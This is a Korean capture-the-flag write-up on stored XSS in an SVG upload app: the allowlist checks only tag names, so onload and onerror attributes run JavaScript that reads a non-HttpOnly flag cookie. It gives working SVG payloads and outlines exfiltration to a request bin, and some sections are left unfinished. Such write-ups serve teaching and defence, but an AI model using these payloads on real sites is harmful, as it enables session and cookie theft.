## 1. Intro

이 문제는 사용자가 업로드한 SVG 파일을 서버에 저장한 뒤, 플래그 쿠키를 가진 Selenium 봇이 해당 SVG를 확인하는 웹 문제이다.

애플리케이션은 업로드된 SVG를 단순 이미지로 출력하지 않는다. 클라이언트에서 파일 내용을 가져온 뒤 `DOMParser`로 파싱하고, 생성된 SVG 요소를 현재 페이지의 DOM에 직접 삽입한다.

서버는 SVG 내부에 포함될 수 있는 위험한 요소를 차단하기 위해 허용된 SVG 요소 목록을 검사한다. 하지만 요소의 이름만 검사하고 `onload`, `onerror` 등의 이벤트 속성은 검사하지 않는다.

따라서 허용된 SVG 요소에 이벤트 핸들러를 삽입하면 JavaScript를 실행할 수 있다.

이 취약점을 이용하면 Selenium 봇의 브라우저에서 `document.cookie`에 접근할 수 있으며, 최종적으로 플래그 쿠키를 확인할 수 있다.

전체 흐름은 다음과 같다.

```text
공격자
  │
  │ 악성 SVG 업로드
  ▼
Flask /upload
  │
  │ UUID가 포함된 이름으로 파일 저장
  ▼
uploads/<UUID>_<filename>
  │
  │ read_file() 호출
  ▼
Selenium Bot
  │
  │ 127.0.0.1에 flag 쿠키 설정
  │
  │ 업로드된 SVG가 지정된 페이지 접속
  ▼
PyScript / JavaScript
  │
  │ SVG 파일 fetch
  │
  │ DOMParser로 SVG 파싱
  │
  │ SVG 요소 이름 검사
  │
  │ 현재 페이지 DOM에 삽입
  ▼
SVG 이벤트 핸들러 실행
  │
  ▼
document.cookie 접근
```

## 2. Code

### 2.1. app.py

```python
from flask import Flask, request, send_from_directory, redirect, url_for, render_template, current_app
from werkzeug.utils import secure_filename
import os
import threading
import time
import uuid
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

app = Flask(__name__)
# 업로드 폴더 지정
UPLOAD_FOLDER = 'uploads'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# 해당 디렉토리가 없을 경우에만 생성
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# 플래그 읽기
try:
    FLAG = open("./flag", "r").read()
except:
    FLAG = "[**FLAG**]"

# 메인 페이지
@app.route('/')
def index():
    # file 쿼리 파라미터로 출력할 svg 파일을 선택
    # file 기본값: uploads/defalt.svg
    file = request.args.get('file', 'uploads/default.svg')
    return render_template('index.html', file=file)

# 업로드 파일 제공
@app.route('/uploads/<filename>')
def uploaded_file(filename):
    # uploads 디렉터리에 저장된 파일을 클라이언트에 전달
    # ../ 기반 경로 순회 공격 제한
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

# 파일 업로드 처리
@app.route('/upload', methods=['POST'])
def upload_file():
    # 1. file 필드가 없을 경우
    if 'file' not in request.files:
        return redirect(request.url)
    
    file = request.files['file']

    # 2. 원본 파일명이 비어 있을 경우
    if file.filename == '':
        return redirect(request.url)
    
    if file:
        # 3. secure_filename()으로 파일명 정규화
        # 공백, 경로 구분 기호, 안전한 ASCII 기반 파일명을 정규화
        filename = secure_filename(file.filename)
        # 4. UUID 생성
        unique_id = uuid.uuid4().hex
        # 5. UUID와 원본 파일명을 결합
        unique_filename = f"{unique_id}_{filename}"
        # 파일 주소 = /uploads/unique_id_filename
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], unique_filename)
        # 6. uploads 디렉토리에 저장
        # 파일 확장자, Content-Type, 실제 파일 형식, 파일 크기, SVG 내부 속성, 외부 리소스 URL 검증 X
        file.save(file_path)
        # 7. 파일 읽기 -> selenium 봇 실행
        read_file(unique_filename)
        # url_for: 주어진 뷰의 실제 url 반환
        # 8. 저장된 파일을 표시하는 페이지로 redirect
        return redirect(url_for('index', file=f'uploads/{unique_filename}'))

    # 204: 성공, 클라이언트에 보내줄 데이터가 없음
    return '', 204

# selenium 봇
def read_file(filename):
    driver = None

    # 쿠키 생성
    # HttpOnly 속성 X
    cookie = {"name": "flag", "value": FLAG}
    cookie.update({"domain": "127.0.0.1"})

    try:
        # 브라우저 설정
        service = Service(executable_path="/usr/local/bin/chromedriver")
        options = webdriver.ChromeOptions()
        for arg in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(arg)

        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)

        # 메인 페이지 접속
        driver.get("http://127.0.0.1:8000/")
        # flag cookie 추가
        driver.add_cookie(cookie)
        # 업로드 된 svg를 표시하는 페이지로 이동
        driver.get(f"http://127.0.0.1:8000/?file=uploads/{filename}")

        # svg 요소 생성될 때까지 기다림
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "svg")))

    except Exception as e:
        driver.quit()
        return False
    driver.quit()
    return True

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

```text
1. multipart 요청에 file 필드가 있는지 검사
2. 원본 파일명이 비어 있는지 검사
3. secure_filename()으로 파일명 정규화
4. UUID 생성
5. UUID와 원본 파일명을 결합
6. uploads 디렉터리에 저장
7. read_file()로 Selenium 봇 실행
8. 저장된 파일을 표시하는 페이지로 리다이렉트
```

검증되지 않는 항목:

```text

Content-Type
실제 파일 형식
파일 크기
SVG 내부 속성
외부 리소스 URL
```

### 2.2. main.py

```python
import random
from js import document, DOMParser, URL, FileReader, console, setTimeout, window
from pyodide.http import pyfetch
from pyodide.ffi import create_proxy
from pyodide.ffi.wrappers import set_interval, clear_interval

svg_mover = None 

class SvgMover:
    # svg 초기화
    def __init__(self, svg_element, interval=100):
        self.svg_element = svg_element
        self.container = document.getElementById('svg-container')
        self.container.innerHTML = ""
        self.container.appendChild(self.svg_element)

        self.paths = self.svg_element.getElementsByTagName("path")

        self.positions = [{'x': 0, 'y': 0} for _ in range(len(self.paths))]
        self.directions = [{'x': random.choice([-1, 1]), 'y': random.choice([-1, 1])} for _ in range(len(self.paths))]

        self.interval = interval
        self.timer = set_interval(self.animate, self.interval)

    # svg animate 설정
    def animate(self):
        for i, path in enumerate(self.paths):
            pos = self.positions[i]
            dir = self.directions[i]

            pos['x'] += dir['x'] * random.uniform(0.1, 0.5)
            pos['y'] += dir['y'] * random.uniform(0.1, 0.5)

            if pos['x'] > 40 or pos['x'] < -40:
                dir['x'] *= -1
            if pos['y'] > 40 or pos['y'] < -40:
                dir['y'] *= -1

            path.setAttribute("transform", f"translate({pos['x']}, {pos['y']})")

    # svg animate 정지
    def stop(self):
        if hasattr(self, 'timer'):
            clear_interval(self.timer)

def handle_upload(event):
    # Event.preventDefault(): 어떤 이벤트를 명시적으로 처리하지 않은 경우, 해당 이벤트에 대한 사용자 에이전트의 기본 동작을 실행 X
    # 사용자 에이전트: 사용자를 대표하는 컴퓨터 프로그램 -> selenium
    event.preventDefault()
    file_input = document.getElementById('file-input')
    file = file_input.files.item(0)
    
    if file:
        file_reader = FileReader.new()
        file_reader.onload = create_proxy(lambda e: load_new_svg(file_reader.result))
        file_reader.readAsText(file)

# 응답 문자열을 DOMParser를 통해 SVG 문서로 파싱
def load_svg_from_string(svg_string):
    parser = DOMParser.new()
    # DOMParser.parseeFromString(string, mimeType) -> SVG, XML 문서
    doc = parser.parseFromString(svg_string, "image/svg+xml")

    # 태그가 <svg>가 아니거나
    if doc.documentElement.tagName != "svg" or doc.documentElement.namespaceURI not in ["http://www.w3.org/2000/svg", "x"]:
        raise ValueError("Root element is not <svg> or has incorrect namespace")

    # svg 요소 허용 목록
    allowed_elements = [
        "svg", "path", "rect", "circle", "ellipse", "line", "polyline", "polygon",
        "text", "tspan", "textPath", "altGlyph", "altGlyphDef", "altGlyphItem",
        "glyphRef", "altGlyph", "animate", "animateColor", "animateMotion",
        "animateTransform", "mpath", "set", "desc", "title", "metadata",
        "defs", "g", "symbol", "use", "image", "switch", "style"
    ]

    # 모든 요소를 순회하면서 목록에 없는 요소 거부
    elements = doc.getElementsByTagName("*")
    for element in elements:
        if element.tagName not in allowed_elements:
            raise ValueError(f"Disallowed SVG element found: {element.tagName}")

    return doc.documentElement

def load_new_svg(svg_content):
    svg_container = document.getElementById('svg-container')
    original_svg_content = document.getElementById('original-svg-content')

    try:
        # 새로운 svg_element 가져옴
        svg_element = load_svg_from_string(svg_content)
        # 태그명이 <svg>가 아닐 경우
        if svg_element.tagName != "svg":
            original_svg_content.innerHTML = "Invalid SVG!!"
            svg_container.innerHTML = "Invalid SVG!!"
            raise ValueError("Not a valid SVG")
    except Exception as e:
        # original_svg_content 내부에 에러 메시지를 띄움
        original_svg_content.innerHTML = "Invalid SVG!!"
        svg_container.innerHTML = "Invalid SVG!!"
        console.error(f"Invalid SVG: {e}")
        return

    # svg DOM에 삽입
    original_svg_content.innerHTML = svg_content

    # svg_element로 svg_content를 로드해서 불러옴
    svg_element = load_svg_from_string(svg_content)
    svg_container.innerHTML = ""
    # svg_container 자식으로 추가
    svg_container.appendChild(svg_element)

    initialize_svg_mover(svg_content)

# svg mover 초기화
def initialize_svg_mover(svg_content):
    global svg_mover
    svg_element = load_svg_from_string(svg_content)
    if svg_mover:
        svg_mover.stop()
    svg_mover = SvgMover(svg_element, interval=50)

# 비동기 함수, svg fetch
async def fetch_svg(file):
    response = await pyfetch(file)
    svg_content = await response.text()
    load_new_svg(svg_content)

upload_form = document.getElementById('upload-form')
# create_proxy(): JS 이벤트를 py-script로 연결
upload_form.addEventListener('submit', create_proxy(handle_upload))

async def main():
    file = window.location.search.split('file=')[1] if 'file=' in window.location.search else 'uploads/default.svg'
    await fetch_svg(file)

import asyncio
asyncio.ensure_future(main())
```

  ↓
현재 페이지 DOM에 삽입
  ↓
이벤트 핸들러 실행

JavaScript가 document.cookie 접근

## 3. Vuln

### 3.1 취약점 개요

핵심 취약점은 SVG 허용 목록이 **요소 이름만 검사하고 속성을 검사하지 않는 것**이다.

```python
if element.tagName not in allowed_elements:
    raise ValueError(...)
```

이 검사는 다음 항목을 확인하지 않는다.

```text
onload
onerror
onclick
onmouseover
onbegin
href
xlink:href
style
외부 리소스 주소
```

따라서 허용된 요소에 이벤트 핸들러를 추가할 수 있다.

## 3.3 허용된 요소의 이벤트 속성

최상위 `svg` 요소는 허용 목록에 포함되어 있다.

```text
svg → 허용
```

하지만 `onload` 속성은 검사하지 않는다.

```xml
<svg
  xmlns="http://www.w3.org/2000/svg"
  onload="alert(document.cookie)">
</svg>
```

요소 검사 결과는 다음과 같다.

```text
요소 이름: svg
허용 여부: 허용
속성 검사: 수행하지 않음
```

따라서 `onload` 속성이 제거되지 않은 채 DOM에 삽입될 수 있다.

허용된 `image` 요소의 `onerror` 이벤트도 같은 원리로 사용할 수 있다.

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <image
    href="/not-found"
    onerror="alert(document.cookie)"
  />
</svg>
```

## 3.4 Stored XSS

공격자가 업로드한 SVG는 서버의 `uploads` 디렉터리에 저장된다.

```text
사용자 입력
→ 서버 저장
→ 관리자 봇이 저장된 파일 열람
→ JavaScript 실행
```

따라서 이 취약점은 저장형 XSS의 특성을 가진다.

보다 구체적으로는 다음과 같이 분류할 수 있다.

## 3.5 쿠키 보안 속성 부재

Selenium 봇의 플래그 쿠키에는 `HttpOnly`가 설정되지 않았다.

```python
cookie = {
    "name": "flag",
    "value": FLAG,
    "domain": "127.0.0.1"
}
```

따라서 동일 출처 JavaScript에서 다음 코드가 동작한다.

```javascript
document.cookie
```

`HttpOnly`가 설정되어 있었다면 JavaScript에서 해당 쿠키를 읽을 수 없었을 것이다.

## 3.6 동일 출처 실행

Selenium은 다음 주소에서 페이지를 연다.

```text
http://127.0.0.1:8000/
```

플래그 쿠키도 `127.0.0.1` 도메인에 설정된다.

SVG는 해당 메인 페이지의 DOM에 직접 삽입된다.

따라서 SVG 이벤트 핸들러는 동일 출처인 다음 환경에서 실행된다.

```text
Scheme: http
Host: 127.0.0.1
Port: 8000
```

이로 인해 `document.cookie`로 플래그 쿠키에 접근할 수 있다.

## 3.7 외부 요청과 쿠키

외부 서버로 요청을 보낸다고 해서 `127.0.0.1`의 쿠키가 외부 도메인으로 자동 전송되지는 않는다.

```javascript
location.href = "https://example.com";
```

위 요청에는 `127.0.0.1` 쿠키가 포함되지 않는다.

브라우저는 쿠키를 도메인별로 분리하기 때문이다.

쿠키 값을 전달하려면 동일 출처에서 먼저 `document.cookie`로 값을 읽어야 한다.

```text
잘못된 방식
외부 서버로 단순 GET 요청
→ 127.0.0.1 쿠키가 자동 전송되지 않음

가능한 방식
document.cookie로 값 읽기
→ URL 파라미터 등에 값을 포함
→ 외부 요청 전송
```

## 4. Payload

공격 시나리오

1. svg 파일 작성
2. 파일 업로드
3. request bin에 접속

## 4.1 검증용 SVG

`script` 요소는 차단되므로 허용된 `svg` 요소의 `onload` 속성을 사용한다.

```xml
<svg
  xmlns="http://www.w3.org/2000/svg"
  onload="alert(document.cookie)">
</svg>
```

이 SVG에는 다음 요소만 존재한다.

```text
svg
```

`svg`는 허용 목록에 포함되므로 요소 검사에 통과한다.

`onload` 속성은 검사되지 않으므로 그대로 유지된다.

## 4.2 공격 시나리오

```text
악성 SVG 작성
    ↓
파일 업로드
    ↓

    ↓

    ↓

    ↓

    ↓

    ↓

    ↓

```

## 4.4 취약점의 근본 원인

취약점은 하나의 코드만으로 발생하지 않고 다음 조건이 결합되어 발생한다.

### 원인 1: SVG 업로드 허용

```python
file.save(file_path)
```

확장자와 콘텐츠 검증 없이 파일이 저장된다.

### 원인 2: 불완전한 필터

```python
if element.tagName not in allowed_elements:
    raise ValueError(...)
```

요소 이름만 검사하고 속성을 검사하지 않는다.

### 원인 3: 활성 DOM 삽입

```python
svg_container.appendChild(svg_element)
```

SVG를 단순 이미지가 아니라 실제 DOM 요소로 삽입한다.

### 원인 4: 쿠키의 `HttpOnly` 부재

```python
cookie = {
    "name": "flag",
    "value": FLAG,
    "domain": "127.0.0.1"
}
```

JavaScript가 쿠키를 읽을 수 있다.
